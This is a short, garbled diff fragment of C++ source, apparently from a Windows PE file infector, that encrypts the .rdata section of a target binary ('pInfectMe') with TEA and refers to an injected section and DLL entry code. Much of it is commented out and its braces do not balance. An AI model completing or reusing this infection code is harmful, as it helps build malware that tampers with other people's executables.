@@ -1,4 +1,57 @@
 /***
+ *	main32.cpp
+ *	in main32
+ *
+ *
+ ==============================================================================================
+ 		else if (memcmp(pSectionHeader->Name, ".rdata", 6) == 0)
+		{	// encrypt rdata section
+
+			if (pInfectMe->IsDLL())
+			{	// ignore
+			}
+			else
+			{
+++				/*uint32_t *key = (uint32_t *) rc4sbox;
+++				LPDWORD encptr = (LPDWORD) pProcessSection->RawData();
+++
+++				for(DWORD dwPtr = 0; dwPtr < pProcessSection->SizeOfRawData(); dwPtr += 8, encptr += 2)
+++					tea_encrypt((uint32_t *) encptr, key); // CLOSE COMMENT HERE!
+		}
+
+		}
+
+++		//else if (memcmp(pSectionHeader->Name, ".rdata", 6) == 0)
+++		//{
+++		//	pSectionHeader->Characteristics |= 0x03;
+++
+++		//	/*DWORD sizeOfSection = 
+++		//		pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress 
+++		//			- pProcessSection->VirtualAddress 
+++		//			- pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+++		//				
+++		//	LPVOID sectionAddress = rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) (pProcessSection->VirtualAddress + pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size));
+
+++		//	if (pInfectMe->IsDLL())
+++		//		cypher_msg(rc4sbox, (PBYTE) sectionAddress, sizeOfSection);
+++		//	else
+++		//	{
+++		//		uint32_t *key = (uint32_t *) rc4sbox;
+++		//		LPDWORD encptr = (LPDWORD) sectionAddress;
+
+++		//		for(DWORD dwPtr = 0; dwPtr < sizeOfSection; dwPtr += 8, encptr += 2)
+++		//			tea_encrypt((uint32_t *) encptr, key);
+++		//	}
+++		//}
+
+	}
+	
+	//memcpy(pInfectSection->Name, szHermitName, 8);
+	
+	//PIMAGE_SECTION_HEADER pInfectSection = IMAGE_FIRST_SECTION(pInfectMeNtHeader);
+ ==============================================================================================
+
+/***
  *	DllEntryPoint32.cpp
  *	function
  *	#pragma code_seg(".pedll32")
